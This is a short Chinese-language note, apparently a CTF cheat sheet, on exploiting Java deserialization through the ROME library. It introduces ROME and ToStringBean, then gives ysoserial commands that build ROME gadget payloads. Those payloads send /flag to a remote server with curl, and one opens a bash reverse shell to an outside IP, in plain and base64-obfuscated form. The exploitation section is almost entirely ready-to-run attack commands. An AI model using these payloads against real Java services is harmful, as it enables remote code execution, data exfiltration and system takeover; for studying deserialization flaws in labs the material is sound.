## **ROME反序列化**
ROME它指的是一个有用的工具库，帮助处理和操作XML格式的数据。ROME库允许我们把XML数据转换成Java中的对象，这样我们可以更方便地在程序中操作数据。另外，它也支持将Java对象转换成XML数据，这样我们就可以把数据保存成XML文件或者发送给其他系统。

ROME的应用场景包括新闻聚合应用、博客平台的RSS输出、数据分析等，它可以帮助开发者从多个源抓取并处理RSS或Atom feeds，以实时更新内容，也可以用于创建和维护博客的RSS输出，以便读者订阅。


他有个特殊的位置就是ROME提供了ToStringBean这个类，提供深入的toString方法对Java Bean进行操作。
```
<dependencies>
        <dependency>
            <groupId>rome</groupId>
            <artifactId>rome</artifactId>
            <version>1.0</version>
        </dependency>
 </dependencies>
```

<https://xz.aliyun.com/t/13286?u_atoken=bcc44563e868bc8bbf88f038f56e5316&u_asig=1a0c39a017285446910872366e0133>

## **利用**
```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME "curl http://vps:7015 -d @/flag" > a.bin
java -jar ysoserial.jar ROME "curl http://1.2.90.186:1234 -d @/flag" |base64

bash -i >& /dev/tcp/111.111.111.111/7015 0>&1
进行base64编码，YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx

java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTEuMTExLjExMS4xMTEvNzAxNSAwPiYx}|{base64,-d}|{bash,-i}" > a.bin
```